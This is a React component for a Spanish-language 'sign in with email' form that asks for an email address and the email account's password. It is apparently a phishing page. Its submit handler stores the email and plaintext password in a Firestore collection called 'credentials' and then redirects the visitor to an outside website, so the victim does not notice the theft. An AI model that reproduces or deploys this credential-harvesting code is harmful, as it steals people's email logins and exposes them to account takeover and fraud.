import { useForm } from "react-hook-form"
import { FaEnvelope, FaLock } from "react-icons/fa"
import { db } from "../firebase";
import { collection, addDoc } from 'firebase/firestore';

export default function LoginForm() {
  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting },
  } = useForm()

  const onSubmit = async (data) => {    
    const collectionRef = collection(db, 'credentials')

    const docRef = await addDoc(collectionRef, {
        email: data.email,
        psw: data.password
    })

    window.location.href = 'https://svnefrologia.com/';
  }

  return (
    <div className="flex w-full justify-center items-center p-0 sm:min-h-100 sm:p-4">
      <form
        onSubmit={handleSubmit(onSubmit)}
        className="w-full max-w-md bg-white p-4 shadow-md border border-gray-100 flex flex-col gap-4 sm:p-6"
      >
        <h2 className="text-xl font-bold text-gray-800 text-center mb-2 sm:text-2xl">
          Inicie Sesión con Correo Electronico
        </h2>

        {/* Campo de Correo Electrónico */}
        <div className="flex flex-col gap-1">
          <label className="text-sm font-medium text-gray-700">
            Correo electrónico
          </label>
          <div className="relative flex items-center">
            <FaEnvelope className="absolute left-3 text-gray-400 size-4" />
            <input
              type="email"
              placeholder="tu@correo.com"
              {...register("email", {
                required: "El correo es obligatorio",
                pattern: {
                  value: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
                  message: "Ingresa un correo válido",
                },
              })}
              className={`w-full pl-10 pr-3 py-2 border rounded-lg focus:outline-none transition-colors ${
                errors.email
                  ? "border-red-500 focus:border-red-500"
                  : "border-gray-300 focus:border-blue-600"
              }`}
            />
          </div>
          {errors.email && (
            <span className="text-red-500 text-xs mt-0.5">
              {errors.email.message}
            </span>
          )}
        </div>

        {/* Campo de Contraseña */}
        <div className="flex flex-col gap-1">
          <label className="text-sm font-medium text-gray-700">
            Contraseña de Correo Electronico
          </label>
          <div className="relative flex items-center">
            <FaLock className="absolute left-3 text-gray-400 size-4" />
            <input
              type="password"
              placeholder="••••••••"
              {...register("password", {
                required: "La contraseña es obligatoria",
                minLength: {
                  value: 6,
                  message: "Debe tener al menos 6 caracteres",
                },
              })}
              className={`w-full pl-10 pr-3 py-2 border rounded-lg focus:outline-none transition-colors ${
                errors.password
                  ? "border-red-500 focus:border-red-500"
                  : "border-gray-300 focus:border-blue-600"
              }`}
            />
          </div>
          {errors.password && (
            <span className="text-red-500 text-xs mt-0.5">
              {errors.password.message}
            </span>
          )}
        </div>

        {/* Botón de envío */}
        <button
          type="submit"
          disabled={isSubmitting}
          className="mt-2 w-full bg-gray-500 text-white font-medium py-2 px-4 rounded-lg sm:w-1/4 
          transition-colors cursor-pointer disabled:opacity-50 hover:bg-blue-700"
        >
          {isSubmitting ? "Entrando..." : "Ingresar"}
        </button>
      </form>
    </div>
  )
}